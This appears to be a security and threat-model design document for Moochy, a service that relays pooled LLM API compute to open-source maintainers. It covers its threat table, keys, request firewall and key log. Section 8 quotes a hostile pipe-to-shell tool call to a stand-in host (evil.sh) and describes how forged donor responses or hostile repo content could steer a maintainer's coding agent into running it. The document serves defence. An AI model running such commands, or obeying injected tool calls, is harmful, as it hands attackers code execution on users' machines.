# 06 — Security and Trust

> Who can hurt whom, how, and what stops them. Covers the threat model, keys, identity and owner-signed approvals, end-to-end encryption, the Worker's request firewall, the output-injection risk to maintainers, accountability, the key log, privacy, supply chain, local hardening, and provider-terms guardrails.

> **Updated 2026-10-01:** threat model and mitigations now match `spec/CONTRACT.md` (§0a, §1, §11–§14) and ADR-01/33/34. Changes: open-source client (Apache-2.0) and closed relay, no self-hosted relays, trust rests on the client (ADR-01, CONTRACT §0a); unique ASCII usernames with permanent tombstones (§5.1, CONTRACT §11, E21) and new threat rows T24–T27; gRPC link security with per-connection channel binding and HTTP/2 hardening (§16, ADR-33); key log in scope now on `x/mod/sumdb/tlog` + `note` + our own C2SP tiles, no Tessera (D14, D16); relay-asserted membership only under `MOOCHY_INSECURE_DEV=1` (D14); served-task set in memory with a boot-time floor (D18); local control and admin sockets 0600 with peer-uid check; Gateway port picked once and persisted (C5); client defences proved by chaos scenarios E11, E15–E17 (§17, D8); public pseudonyms `ps_…` (D10); Ed25519 verification is ZIP-215 (`ed25519-zebra`).
>
> **Updated again 2026-10-01 (main `b65289e7`):** approvals signed with a separate owner key (`moochy pending` / `moochy accept`), receipt transparency log replaces the "not in v1" note (§10.2), T8 now contained by the `moochy run` sandbox, new §18 Sandboxing (CONTRACT §15).
>
> **Updated 2026-10-02 (main `5f9ccf80`):** owner keys are on main (`moochy owner init`); sandbox row updated for read-only `.git` and `--allow-host`.

---

## 1. Assets

| Asset | Owner | Worst outcome if lost |
|---|---|---|
| Provider API keys | Donor | Unbounded spend; account ban by the provider |
| Donor budget | Donor | Overspend beyond the pledge |
| Maintainer code and prompts | Maintainer | Leak of unreleased code, accidental secrets in context |
| Maintainer machine integrity | Maintainer | **Remote code execution via a poisoned agent response** |
| Device private keys | Each user | Impersonation, forged receipts or approvals |
| Relay log and catalog signing keys | Operator | Forged history or prices (detectable by monitors and the public anchor) |
| Ledger integrity | Everyone | Fake donations, stolen budget, false leaderboards |
| User identities (PII) | Everyone | Privacy harm |

## 2. Adversaries

| ID | Adversary | Capabilities assumed |
|---|---|---|
| A1 | Malicious maintainer / member | Controls their Gateway fully; can send any bytes |
| A2 | Malicious donor | Controls their Worker fully; can return any bytes, lie about usage |
| A3 | Malicious or compromised relay operator (the moochy.dev operator, an insider, or whoever compromises the closed-source Relay) | Full control of the Relay, its code, and its database; cannot break cryptography; cannot modify Nodes already installed |
| A4 | Network attacker | Can observe, delay, and drop traffic; cannot break TLS |
| A5 | Web attacker | Can make victims visit pages (CSRF, XSS attempts, DNS rebinding against localhost) |
| A6 | Local unprivileged process or other user on a maintainer's machine | Can reach `127.0.0.1` ports and race to bind them |
| A7 | Supply-chain attacker | Targets the release pipeline or dependencies |
| A8 | Sybil / spammer | Creates many accounts, fake repos, fake donors |
| A9 | Hostile repository content | A malicious PR or issue that steers the maintainer's agent (prompt injection, symlinks) |

---

## 3. Threat table

| # | Threat | Adv. | Mitigation | Residual risk |
|---|---|---|---|---|
| T1 | Steal a donor's provider key | A1–A4 | Key never leaves the donor's machine (I1); OS keychain; sent only to allowlisted provider hosts | Malware on the donor's machine (out of scope) |
| T2 | Make the donor's account execute things server-side (code execution, web fetch, MCP connector, paid add-ons) | A1 | **Request firewall** (§7): strict allowlist, recursive, with provider headers sealed and allowlisted too | Firewall bugs → fuzzing + two-person review of allowlist changes |
| T3 | Read data in the donor's provider account (file ids, stored responses, batches) | A1 | Firewall rejects any file reference, stored-response reference, or non-chat endpoint, including inside nested content | — |
| T4 | Overspend a donor | A1, A3 | Three-layer caps ([05 §6](05-ledger-and-accounting.md)); deterministic, Worker-checked input estimate; route header bound to the body | The sum of overages of open attempts |
| T5 | Declare a cheap model or small input, send something expensive | A1 | Worker route/body consistency check, exact estimate match ([03 §7](03-wire-protocol.md)) | — |
| T6 | Read prompts and outputs in transit or at rest | A3, A4 | End-to-end envelopes with **per-body request keys and per-attempt response keys** ([03 §6](03-wire-protocol.md)); the Relay holds no keys; the database stores no content | Metadata (sizes, timing, models) |
| T7 | Get content sealed to a key the Relay controls (fake device on a real account, or a fake "approved donor") | A3 | **Key log** with owner-signed approvals (§10): Gateways seal only to keys logged for users holding an **owner-signed `DONOR_APPROVED`** for the repo; every Node alerts on unknown keys on its own account; the owner's Node alerts on approvals or repo claims it did not sign; checkpoints are publicly anchored | A Relay can still attempt a MITM, but only by publishing evidence that real users' Nodes flag within one checkpoint interval |
| T8 | **Return a poisoned response that makes the maintainer's agent run malicious tool calls** | A2 | §8: owner approval of each donor, pinned donors, tool-call checks and tripwire, **signed progress checkpoints on every tool call**, **tool calls released only to agents inside the `moochy run` sandbox** (§18), guidance to keep human approval on | **Highest residual risk in the system.** It cannot be eliminated without verified compute (§15) |
| T9 | Run inference on donor keys as the Relay, replay tasks, or charge one repo's pledge for another's task | A3 | **Gateway task signatures**, owner-signed `MEMBER_ADDED`, pledge↔repo check, ULID freshness, served-task set at the Worker with a boot-time floor ([03 §7.2](03-wire-protocol.md), §17); proved by E16 | — |
| T10 | Garbage output, cheaper model, or inflated usage to farm the leaderboard | A2 | Gateway checks commitments, usage bands, and the reported model; signed disputes; leaderboard counts only undisputed receipts | A donor can still serve low-quality output for real money (no incentive) |
| T11 | Forge receipts, approvals, or rewrite history | A3 | Donor-signed receipts and projections; owner-signed approvals; append-only key log with signed checkpoints anchored externally | Censorship (omitting projections from public pages) is possible but visible to the parties holding the receipts |
| T12 | Relay a stolen login, or replay an auth signature | A3, A4 | Signature covers the **origin the Node dialed** (`https://host:port`) and the RFC 9266 channel binding of that exact TLS connection; auth is per HTTP/2 connection and streams from any other connection are refused ([03 §3](03-wire-protocol.md), §16) | — |
| T13 | Use a stolen device | any | `moochy logout` / web revoke → `KEY_REVOKED`; the Relay drops the device at once | Window until the user notices |
| T14 | Use the maintainer's local Gateway from another process, user, or website | A5, A6 | Loopback only; repo-scoped random local tokens; Host-header check against DNS rebinding; no CORS; a stable port chosen once and persisted, optionally held by the OS service manager; `moochy doctor` checks the port owner's uid; CLI control over a 0600 Unix socket with peer-uid check (§13) | Same-user malware (out of scope) |
| T15 | Exfiltrate local files through MCP `files` (traversal, symlinks, injected paths) | A6, A9 | Root = git top-level bound to the token ∩ client roots; realpath containment; no symlinks; deny `.git/**` and secret-shaped files; `git check-ignore` (§13) | Secrets in normal tracked files (scrubber is best-effort) |
| T16 | CSRF / XSS on the web dashboard | A5 | SameSite=Lax cookies; state changes require `HX-Request` + Origin check; strict CSP; auto-escaping templates | — |
| T17 | Malicious client release | A7 | Open-source client (Apache-2.0); signed releases with provenance, reproducible Linux builds, dependency vetting, no silent auto-update (§12) | A compromised upstream crate |
| T18 | Sybil accounts flooding pledges or claims | A8 | GitHub/GitLab identity; repo claims need admin permission; owner approval of donors; rate limits | Determined attacker with aged accounts |
| T19 | Donor's provider account banned because of a maintainer's prompts | A1 | Donors pledge only to repos they choose and that approve them; `metadata.user_id` pseudonymous attribution; local journal | Provider decisions are outside Moochy's control → explicit donor consent |
| T20 | Secrets from the maintainer's environment leaking to donors | A1 (accidental), A9 | Gateway **secret scrubber** before sealing (also on MCP files) | Novel secret formats |
| T21 | Prompt-cache timing side channel between members sharing a donor key | A1 | Only reveals whether an *exact* prefix is cached; prefixes include per-repo content | Accepted (low) |
| T22 | Denial of service on the Relay | any | Per-IP connection limits, per-device rate limits, byte budgets for buffered bodies, sheddable submit queue, gRPC/HTTP/2 hardening (§16) | Large volumetric attacks → optional CDN/DDoS front |
| T23 | Impersonation through look-alike, case-variant, or reserved usernames | A8 | Unique ASCII-only lowercase handles with case-insensitive uniqueness (confusables are refused by the ASCII-only rule, not by a lookalike table), reserved staff/system words and route segments, no auto-suffix at signup (§5.1, CONTRACT §11); proved by E21 | Visually similar ASCII handles (`rn` vs `m`) |
| T24 | **Username recycling**: wait for a handle to be renamed or deleted, register it, and inherit its links, badges, mentions, and reputation | A8 | Every handle ever used becomes a **permanent tombstone** that is never assigned again; the old handle redirects to the new one for 90 days, then returns "gone"; renames at most once per 30 days (§5.1); proved by E21 | Off-platform links that never followed the redirect |
| T25 | **Terminal-escape injection**: a hostile handle, repo name, model name, or error string from the Relay rewrites the user's terminal (fake prompts, hidden text, OSC 8 links, clipboard writes) | A3, A8 | The CLI and logs never print a server-provided string raw: control characters (C0, C1, DEL, ESC sequences) are escaped before output; handles are ASCII-only anyway (CONTRACT §11) | — |
| T26 | HTTP/2-level attacks on the gRPC listener (Rapid Reset CVE-2023-44487, CONTINUATION flood, HPACK bombs, stream exhaustion, oversized messages) | any | gRPC hardening list (§16): stream-open and reset rate limits, current grpc-go/x/net, header-list and message-size caps, `MaxConcurrentStreams` 128, per-IP caps, no task state before auth | Volumetric floods (T22) |
| T27 | **Parser differential**: a protobuf field or a duplicate JSON key is read one way by the Relay and another way by a Node | A1, A3 | Protobuf is never trusted for strict security decisions; those read the signed JSON bytes with the strict parser (duplicate keys, invalid UTF-8, lone surrogates, out-of-range numbers, depth > 64 all rejected; CONTRACT §1); the Worker forwards only bytes it re-serialized from its own validated tree | — |

---

## 4. Key management

### 4.1 Device keys

- Created by `moochy login` on the device and **never exported**: one Ed25519 signing key and one X25519 encryption key.
- Stored in the OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service). **Headless fallback:** a file encrypted with a passphrase-derived key (scrypt), or `systemd-creds` / TPM-bound credentials. This replaces the draft's custom AES-256-GCM store, which forced a passphrase prompt on every daemon start, an unacceptable UX for an always-on service.
- **Registration** goes through the device-approval flow (gRPC `DeviceStart` / `DevicePoll`, unauthenticated and strictly rate-limited per IP): the Node shows a short code, the user approves in the signed-in browser, and the Relay binds `{device, user, sign_pub, enc_pub, roles, suite}` and appends a `KEY_ADDED` entry (with a proof-of-possession signature by the new key) to the key log.
- **Rotation**: `moochy keys rotate` registers a new device record and revokes the old one after a 24 h grace period. Both are logged.
- **Revocation**: `KEY_REVOKED` takes effect immediately at the Relay and is published in the key log.

### 4.2 Provider API keys

- Added with `moochy keys add <anthropic|openrouter|deepseek|openai>` (interactive prompt, or `--key-stdin` for scripts; never a CLI argument, so it stays out of shell history) and stored in the keychain.
- Keys are sent only to the adapter's allowlisted official host. `--base-url` (fake providers in tests) is accepted only for loopback hosts **and** only when `MOOCHY_INSECURE_DEV=1` is set; otherwise it is refused, so a social-engineered command cannot redirect a donor's key to an attacker's server.
- Validated on add and periodically with a **free** call to the provider's models endpoint. This also tells the Worker which models the key can really use, and the Worker advertises exactly those.
- **Never** sent to the Relay, never logged, never included in crash reports (redaction is unit-tested).

### 4.3 Relay keys

| Key | Purpose | Storage | Rotation |
|---|---|---|---|
| Log signing key (Ed25519, signed-note format) | Key-log checkpoints | Generated offline; encrypted file or KMS at boot | Yearly or on incident; both keys sign during the transition |
| Catalog signing key | Price catalog | Same | Same |
| TLS keys | Transport (HTTP and gRPC listeners) | ACME autocert (`relay serve --autocert-domain`) or `--tls-cert`/`--tls-key` | Automatic |

No Relay key can decrypt user content. **That is the point.**

---

## 5. Identity, repo ownership, and authorization

| Subject | Authenticates with | Authorized for |
|---|---|---|
| Web user | GitHub / GitLab OAuth (identity + public repo metadata) → session cookie | Their pledges and devices; viewing their repos' consoles |
| Node | Device signature with channel binding ([03 §3](03-wire-protocol.md)) | Roles granted at approval: `gateway`, `worker` (optionally scoped to one repo) |
| Repo owner | At claim time, the provider API confirms **admin** permission with the user's OAuth token (used once, not stored); the owner's Node then **signs** `REPO_CLAIMED` | Approving donors and members **by signature** |
| Member | An owner-signed `MEMBER_ADDED` entry in the key log | Consume the repo's pool within their quota |

**Approvals are signed on the owner's own machine, not clicked on a website.** The web (Project settings) lists pending donors and members; approval happens with `moochy owner init` (once), `moochy pending`, then `moochy accept <handle or ps_pseudonym> --repo owner/name` (alias `moochy approve`) / `moochy members add <user>`, which show exactly what will be signed and require confirmation. The signature is made with the owner's **owner key** (CONTRACT §15.4, `spec/KEYLOG.md` §4): an Ed25519 key separate from every device key, encrypted at rest, loaded only by the foreground CLI for one confirmed command, and never read by the background Node, so even a fully compromised background process cannot approve a donor. The entry the Relay appends it to the key log, and Gateways and Workers verify it themselves. The Relay can **show** a request but cannot **forge** an approval. The draft's idea of "anyone with push access is automatically a member" is dropped: it would make membership relay-asserted.

**Relay-asserted membership is a test mode, not a fallback (D14).** The key log is in scope now (§10), not deferred. Until it ships, a Worker accepts membership and donor approval asserted by the Relay (the dev API's `/dev/member` and `/dev/pledge`) **only** when started with `MOOCHY_INSECURE_DEV=1`, which is meant for tests and design partners. Without that variable, and always once the key log is live, the Worker requires the owner-signed log entries (`REPO_CLAIMED`, `DONOR_APPROVED`, `MEMBER_*`) and refuses the task otherwise (fail closed).

**Public repositories only.** Moochy's purpose is open source, and public visibility makes the use auditable. Private repositories are not offered, and there is no self-hosted relay alternative (CONTRACT §0a).

### 5.1 Unique usernames (handles)

Every user has exactly one Moochy username, unique on the instance. Handles appear on public pages, in the audit feed, in badges, in `moochy approve <donor>` and `moochy members add <user>`, so a handle that can be faked or recycled is a direct path to approving the wrong person. The rules (CONTRACT §11, verified by E21):

- **Format:** ASCII only, lowercase, `^[a-z0-9](?:[a-z0-9-]{1,30}[a-z0-9])$` (3–32 characters), no `--`. Confusables are handled by this rule rather than by a lookalike table: Cyrillic `а`, Greek `ο`, zero-width characters, and RTL marks are simply not in the alphabet, so `аlice` (Cyrillic а) is refused, not normalized.
- **Case-insensitive uniqueness:** stored lowercase, with SQLite `UNIQUE` + `COLLATE NOCASE` as a second guard, so `Alice` and `alice` are the same handle.
- **Chosen at first sign-in:** the default is the provider login lowercased **if it is valid and free**; otherwise the user must pick one. There is **no automatic suffixing**: silently handing someone `alice-2` would make them look like `alice`.
- **Reserved words** are refused at signup and at rename: every first path segment of the web routes and the API (`api`, `dev`, `p`, `r`, `log`, `open`, `connect`, `explore`, `station`, `console`, `device`, `devices`, `claim`, `leaderboard`, `auth`, `admin`, `static`, `mcp`, `v1`), staff and system words (`moochy`, `admin`, `root`, `support`, `security`, `staff`, `official`, `system`, `null`, `undefined`, `anonymous`, `relay`, `node`, `bot`), and every handle ever used before. A new top-level route adds its segment to the list.
- **Rename** at most once per 30 days. The old handle becomes a **permanent tombstone**: it is never assigned to anyone else (this blocks username-recycling takeovers of links, badges, and reputation) and redirects to the new handle for 90 days.
- **Same rules in both languages:** Go (Relay) and Rust (the Node prints handles) share the test vectors `spec/vectors/usernames.json` (valid, invalid, reserved, confusables, case variants).
- **No raw server strings in the terminal:** the CLI and logs never print a handle, repo name, or any other server-provided string raw; control characters are stripped or escaped (T25).

The key log never contains handles (§10.3); it uses the public pseudonym (`ps_` + 16 random base32 characters, never derived from the internal `user_id`).

**Uniqueness constraints enforced by the database, not only by code** (CONTRACT §11):

| Thing | Unique key |
|---|---|
| User handle | `users.username` (case-insensitive) + `username_tombstones.username` |
| User pseudonym (public log) | `users.pseudonym` |
| Provider identity | (`provider`, `provider_user_id`); at most one identity per provider per user |
| Device signing key | `devices.sign_pub` |
| Device name | (`user_id`, lower(`name`)) |
| Repository | (`provider`, `provider_repo_id`) and (`provider`, lower(`owner`), lower(`name`)) |
| Live pledge | (`donor_id`, `repo_id`) where status ∈ {pending, active, paused} |
| Membership | (`repo_id`, `user_id`) |
| Local token | the random token itself (≥ 256-bit), stored hashed |
| Task | (`gateway_device`, `task_id`) |
| Receipt | (`task_id`, `attempt`); `receipt_ref` unique |
| Web session | `id_hash` |

---

## 6. End-to-end encryption: what it buys and what it costs

**Buys:** the Relay, its operator, its hosting provider, and anyone who steals its database learn nothing about prompts or outputs. The Relay is closed source, and even an open-source server would not help much: nobody can prove which binary a remote server is actually running. End-to-end encryption makes that question irrelevant for privacy. Everything that touches your keys, your code, and the cryptography runs in the **open-source client (Apache-2.0)** on your own machine, which you can read, build, and verify; the Relay only ever sees ciphertext, plus the plaintext route header and accounting metadata. Caps and approvals do not depend on the Relay either: owner-signed approvals and the key log (§10), the Worker's local caps, and the donor's provider-side spend limit cover the rest. **Users never have to trust the operator, only the client they can verify.**

**Costs, and how they are paid:**

| Cost | Resolution |
|---|---|
| Failover requires knowing recipients upfront | Recipient-independent body + cheap per-recipient wraps; per-attempt response keys keep failover safe ([03 §6](03-wire-protocol.md)) |
| Anyone with a public key can build an envelope | Gateway task signatures + owner-signed membership ([03 §7.2](03-wire-protocol.md)) |
| The Relay cannot validate content | Validation moves to the Worker (firewall) and the Gateway (scrubber, tool-call checks) |
| The Relay cannot moderate content | Deliberate. Providers run their own safety systems on every call; owners approve donors and donors choose repos. Documented in the terms |
| The Relay cannot meter tokens | Usage comes from donor-signed receipts, checked by the maintainer's Gateway |

---

## 7. The Worker's request firewall

The draft's claim "text-only, zero arbitrary execution" is **not automatically true** of modern provider APIs. They offer server-side code execution, web fetch and search, MCP connectors that make the provider connect to arbitrary URLs, file storage, stored responses, batch jobs, paid plugins, and premium speed tiers. A relayed request could turn the donor's account into a remote execution platform, an exfiltration channel for files in the donor's account, or a cost multiplier.

**Rule: allowlist, never denylist, applied recursively.** Each provider adapter defines exactly which endpoints, headers (and header values), top-level fields, content-block types (including those nested in `tool_result` and documents), and tool types are allowed. **Anything unknown is rejected** with `nack{code: firewall}`. The precise reason ("field `mcp_servers` is not allowed") is sealed to the Gateway; the Relay sees only the code.

### 7.1 Anthropic Messages adapter (v1 policy)

| Element | Policy | Why |
|---|---|---|
| Endpoint `POST /v1/messages` | allow | The product |
| `count_tokens` and every other endpoint (batches, files, models, skills, agents, …) | **deny** | `count_tokens` is answered locally by the Gateway; the rest may touch the donor's account data |
| Provider headers (API version, beta values) | Sealed in the inner payload, covered by `req_commit`, **allowlisted per catalog version**; unknown beta values rejected | Some beta headers change billing or features on their own (e.g. long-context pricing), so they need the same allowlist as the body |
| `model` | allow if in pledge policy **and** offered by this key (after slug mapping) | — |
| `max_tokens` | required; ≤ catalog `max_output` | Bounds cost |
| `messages`, `system`, `stop_sequences`, sampling parameters the model accepts, `stream`, `metadata` | allow | Plain inference |
| `thinking`, `output_config.effort` | allow, effort ≤ pledge `max_effort` | Cost bound |
| `output_config.format` (structured outputs) | allow | Text only |
| `cache_control` (top-level and per block) | allow | Saves donors money |
| Content blocks: `text`, `image` (base64), `document` (base64 or plain text), `tool_use`, `tool_result`, `thinking`, `redacted_thinking` | allow; `image` needs the `images` flag; `document` needs the `documents` flag (strict level denies PDFs) | Inline data only |
| Any content whose source is a **file id** or a **URL**, at any nesting depth | **deny** | Reads the donor's file store or makes the provider fetch URLs |
| `tools[]` with `input_schema` (custom tools) | allow | Executed by the **maintainer's** harness, never by the donor or the provider |
| Anthropic-defined **client-executed** tools (bash, text editor, memory, client-side computer use) | allow | Executed on the maintainer's side; the donor only relays text |
| **Server-executed tools** (web search, web fetch, code execution, tool search, advisor, server-hosted computer use) | **deny** (no opt-in in v1) | Execution or extra billed model calls on the donor's account |
| `mcp_servers` / MCP toolsets | **deny** | The provider would connect to arbitrary servers on the donor's behalf |
| `container`, skills | **deny** | Server-side execution environment |
| Server-side model fallbacks on refusal | **deny** | Would bill a model outside the pledge allowlist |
| `speed: fast` | deny unless the pledge has the `fast` flag | Price multiplier |
| `service_tier`, `inference_geo` | deny unless explicitly allowed in policy | Price and data-residency are the donor's call |

**Safe mutations** (the only ones the Worker performs; `req_commit` is computed over the body *before* them):
- set `metadata.user_id` to a pseudonymous `H(repo_id ‖ member_id)`, so the donor's provider account can attribute abuse to a specific end user;
- map the public model id to the provider's model id through the signed catalog.

### 7.2 OpenAI-compatible adapters (OpenAI, OpenRouter, DeepSeek, xAI, vetted hosts)

Allow `POST /v1/chat/completions` with messages, function tools, standard sampling, and reasoning-effort parameters. **Deny:** hosted or built-in tools (web search, file search, code interpreter, computer use), web-search options, `n > 1` (multiplies output beyond `max_tokens`), predicted outputs (billed as output), `service_tier`, audio and other modalities, any file or stored-response reference, and non-chat endpoints. **Safe mutations:** force `store: false` where storage exists, and **turn on stream usage reporting** so every streamed receipt has real usage.

| Provider | Extra rules |
|---|---|
| **OpenRouter** (OpenAI-compatible and Anthropic-compatible endpoints) | Deny `models[]` fallback lists, `route`, `plugins` (web search, file parsing billed per page), "online" and other uncatalogued model variants. The Worker sets OpenRouter's **max-price** preference to the catalog price, so upstream routing can never exceed the reservation. Settlement uses OpenRouter's reported cost ([05 §3](05-ledger-and-accounting.md)) |
| **DeepSeek** (OpenAI-compatible and Anthropic-compatible endpoints) | Plain chat and reasoning models; text only. Reasoning output is billed as output, covered by `max_tokens` |
| **Other OpenAI-compatible hosts** | Only hosts on the vetted list, each with its own table |

The exact endpoints and field names for each provider are pinned in Phase 0.

### 7.3 Firewall engineering

- Written as data (a per-adapter table of allowed paths, types, and header values) interpreted by a small recursive validator. Allowlist changes show up as small, reviewable diffs.
- **Fuzzed** continuously with a corpus of real client traffic (Claude Code, OpenCode, Aider, Cline, …) plus mutations, including deeply nested content.
- **Two-person review** for any change that widens an allowlist.
- **Opt-in telemetry**: Workers that opt in report *field names only* (never values) of rejections, so the team learns quickly when a popular client starts sending a new harmless field.
- **Donor strictness levels:** `strict` (default; the tables above) or `paranoid` (also deny images and documents, lower `max_tokens` ceiling).

---

## 8. The output-injection risk to maintainers (the draft's blind spot)

**Scenario:** a malicious donor's Worker ignores the provider and returns a fabricated stream that looks like a normal assistant turn containing a tool call such as `bash {"command": "curl https://evil.sh | sh"}`. The maintainer's agent runs it if it auto-approves commands. The same applies to subtle backdoors in code the agent writes, and to text returned by the MCP `moochy_delegate` tool into an agent that has tools.

No signature can prove the output came from the real model (§15). Defense in depth:

| Layer | Mechanism | Default |
|---|---|---|
| **Who can serve you** | The repo owner **approves each donor by signature** (§5). Most donors are known community members or sponsors | Approval required |
| **Pinned donors** | A maintainer can restrict a session or the whole repo to named donors | off |
| **Structural checks on tool calls** | The Gateway holds each tool call until its end (Anthropic `tool_use` blocks; OpenAI `tool_calls` per index; text still streams immediately) and rejects calls whose **name is not in the request's `tools[]`**, whose input **fails the declared `input_schema`**, block types the firewall forbids (`server_tool_use`, `mcp_tool_use`, server tool results), and responses whose model does not match the requested model | on |
| **Signed tool calls** | A tool call is released only after a **Worker progress signature** covering it is verified ([03 §12.3](03-wire-protocol.md)) | on |
| **Tripwire (a speed bump, not a guarantee)** | Pattern scan of tool-call inputs for well-known dangerous shapes (pipe-to-shell, credential paths, persistence locations, encoded payloads, raw-IP connections); on a hit, the call is replaced by an error tool result with a visible warning | on (warn + block) |
| **Untrusted-content envelope for MCP results** | `moochy_delegate` results are wrapped in an explicit "untrusted content from donor X" frame and scanned the same way | on |
| **Human approval** | Onboarding and `moochy connect` state plainly: "When using pooled compute, keep command approval on in your agent" | guidance |
| **Accountability** | Every tool call and every response is bound to the donor's signature over the exact bytes. The maintainer can reveal the evidence (§9) → ban and public record | always |

A capable attacker can evade pattern scanning. The plan does not pretend otherwise: the tripwire catches lazy attacks, and signatures plus approvals make careful ones attributable and costly.

---

## 9. Accountability and disputes

1. `moochy report <task_id>` packages the evidence: the receipt, the progress checkpoints, the response bytes, and **only the salt needed** (`S_resp`, derived separately from `S_req`, so revealing it does not expose the request).
2. The operator (or anyone with the bundle) verifies the donor's signatures and recomputes `resp_commit` → proof that the donor sent exactly those bytes.
3. Outcomes: warning, revocation of approval by the owner, or ban (`KEY_REVOKED` for all of the donor's devices; pledges Ended), recorded as a pseudonymous `MODERATION` entry.
4. **Disputes against maintainers** (for example, false disputes to hurt a donor's ranking) use the same process in reverse, with the donor's local journal and the signed receipt as evidence.

---

## 10. The key log (transparency for identities, approvals, and prices)

### 10.1 Structure

One **append-only Merkle log** (RFC 6962-style tree) built on the Go checksum database's packages: `golang.org/x/mod/sumdb/tlog` for hashing and proofs, `golang.org/x/mod/sumdb/note` for signed checkpoints, and **our own small C2SP tlog-tiles path layer** for serving tiles (D16). Earlier drafts allowed the transparency-dev Tessera library; it is not used, because it is outside the relay's dependency allowlist and the two `x/mod` packages plus a thin tile layer cover the need. The Rust side verifies with `moochy-keylog` (mirror, consistency proofs, own-key and owner alerts).

The key log is in scope **now** (D14). Until it ships, relay-asserted membership is accepted only under `MOOCHY_INSECURE_DEV=1` (§5).

| Entry | Signed by |
|---|---|
| `KEY_ADDED` / `KEY_REVOKED` | Relay (binding to a user) + the new key (proof of possession) |
| `REPO_CLAIMED` | Relay (admin check) + the owner's device |
| `DONOR_APPROVED` / `DONOR_REVOKED` | The owner's device |
| `MEMBER_ADDED` / `MEMBER_REMOVED` | The owner's device |
| `CATALOG` | Relay catalog key |
| `MODERATION` | Relay |

Volume is small (≈ 100k entries per year), so **every Node mirrors it fully** and checks completeness for everything it cares about:

- **Every Node** alerts on any key on its own account that it did not create ("A new device `xyz` was added to your account at 14:02. If this wasn't you, run `moochy keys revoke xyz`").
- **The owner's Node** alerts on any `REPO_CLAIMED`, approval, or membership for its repos that it did not sign.
- **Gateways** seal only to worker keys that are logged, unrevoked, and belong to a donor with an owner-signed `DONOR_APPROVED` for the repo.
- **Workers** accept tasks only from Gateway keys whose user has an owner-signed `MEMBER_ADDED` (or is the owner).

**Checkpoints** are signed every 60 s while the log grows (only for sizes already replicated, [05 §7](05-ledger-and-accounting.md)), pushed to Nodes, and checked with consistency proofs. **External anchoring from day one:** hourly checkpoints are committed to a public Git repository, and Nodes compare the relay-served checkpoints against it. Any fork or rewrite is visible to anyone who ever fetched the anchor. Independent witness cosignatures (C2SP witness protocol) are added after beta.

### 10.2 Receipts are not in the log in v1

(Heading kept for references; superseded by `spec/KEYLOG.md` §8.) Receipts themselves stay with the two parties and the Relay database, and the public audit feed shows **donor-signed projections** ([03 §12.1](03-wire-protocol.md)). In addition there is now a separate **receipt transparency log** (origin `moochy.dev/receipts`, its own key) whose leaf is `lp("moochy/v1/receipt-log", SHA-256(receipt bytes))`. The Relay appends every settled receipt and returns `(index, inclusion proof, signed checkpoint)` in `ReceiptAck`, so either party can prove its receipt was logged and the Relay can no longer silently omit a settled receipt once the parties check inclusion. Witness cosignatures (C2SP `tlog-cosignature`) can be required for both logs (`spec/KEYLOG.md` §7).

### 10.3 No personal data in the log

Append-only and public means **forever**. So the log contains only pseudonymous ids, device public keys, repo ids, signatures, and catalog data. The mapping `pseudonym → username/avatar` lives in the mutable database and is deleted when an account is deleted.

---

## 11. Privacy

| Data | Stored where | Retention | Public? |
|---|---|---|---|
| Prompts / outputs | Nowhere on the Relay. Donor and maintainer local journals only (full text opt-in) | User-controlled | No |
| Task metadata (model, sizes, timings, cost) | Relay DB | 90 days raw, then daily aggregates | Aggregates only |
| Full receipts | Relay DB + the two parties | As long as the account exists | No |
| Receipt projections | Relay DB | Forever | Yes (pseudonymous, daily granularity, no device ids or timestamps) |
| Presence (which donor is online) | Relay memory | Live only | **Aggregated by default**; per-donor presence only if the donor opts in |
| IP addresses | Connection logs | 7 days | No |
| OAuth identity | Relay DB | Until account deletion | Per the pledge's visibility setting |

The draft's public "node-alpha … RTT: 12ms" panel revealed when a specific person's machine is on. It is now **opt-in**.

---

## 12. Supply chain: verify the client, not the server

The source boundary follows the trust boundary (ADR-01, CONTRACT §0a). The **client** (`moochy`, published as the public `moochy-cli` repository), the protocol definition (`.proto` files, test vectors, the public protocol spec), and the user guides are open source under **Apache-2.0**, with DCO sign-off on contributions. Anyone can audit the client or write a compatible one. The **relay and web** (`moochy-core`) are closed source, and self-hosting the relay is not offered. Users cannot verify which code a remote server runs anyway, open or not, so the design never asks them to trust the operator for confidentiality or caps. It asks them to trust the client binary on their own machine, which they *can* verify:

- **Signed releases** of the open client (Sigstore keyless, tied to the CI identity) with **SLSA provenance**. Users verify **externally** (`gh attestation verify` or `cosign verify-blob`). A binary checking itself would prove nothing.
- **Reproducible builds** of the open client for the Linux musl artifacts (the ones donors run on servers) are required for beta; other platforms follow when feasible.
- **Dependency hygiene**: `cargo-deny` (licenses, advisories, bans) and `cargo-vet` audits, especially for crypto and network crates (`ed25519-zebra`, `x25519-dalek`, `hpke`, `chacha20poly1305`, `rustls`, `tonic`, `prost`). The `hpke` crate is widely used but has not had an independent paid audit, so it is explicitly vetted. The open client never imports, links, or copies closed code.
- **Updates**: no silent auto-update. The Node says when a new version exists; `moochy update` verifies signatures before replacing itself. `Hello.min_client_version` can force upgrades only for security fixes.
- **The relay is not something users verify, and they do not need to.** It is built and deployed through the private pipeline (`docs/ops`); `Hello` reports its version as a statement, not a proof. End-to-end encryption, owner-signed approvals in the publicly anchored key log, the Worker's local caps, and the donor's provider-side spend limit are what protect users from a dishonest or compromised relay (A3).
- **Security policy**: public `SECURITY.md` in the client repository, private disclosure channel (covering the relay too), coordinated disclosure, credit for reporters.

---

## 13. Maintainer-side hardening (Gateway and MCP door)

| Control | Detail |
|---|---|
| Loopback only | Binds `127.0.0.1` / `::1`, never `0.0.0.0` |
| Port ownership | When `gateway_addr` is unset, the first `moochy up` picks a free loopback port, **persists it**, and reuses it on every later start, so clients keep a stable base URL (`127.0.0.1:0` only when explicitly configured, as tests do). When installed as a service, the OS service manager can hold that port (launchd socket / systemd `.socket` unit) so no other local user can bind it while the Node restarts; `moochy doctor` checks the listening uid |
| Local control socket | CLI commands (`status`, `pause`, `resume`, `approve`, `members`, `journal`) and the `moochy mcp` stdio shim reach the running Node through the gRPC `LocalControl` service on the Unix socket `<home>/state/node.sock`: mode **0600** and the **peer uid is checked** on every connection, so another local user cannot drive the Node even if file permissions are loosened. Plaintext h2c is allowed only on such local sockets |
| Relay admin socket | Operators use `relay admin …` over the gRPC `RelayAdmin` service on a 0600 Unix socket (`--admin-socket`). It is **never exposed on the network**: there is no TCP listener for admin calls |
| Local tokens | Random, repo-scoped tokens (`mooch_local_…`), rotatable (`moochy env --rotate`). Clients use one as their "API key" |
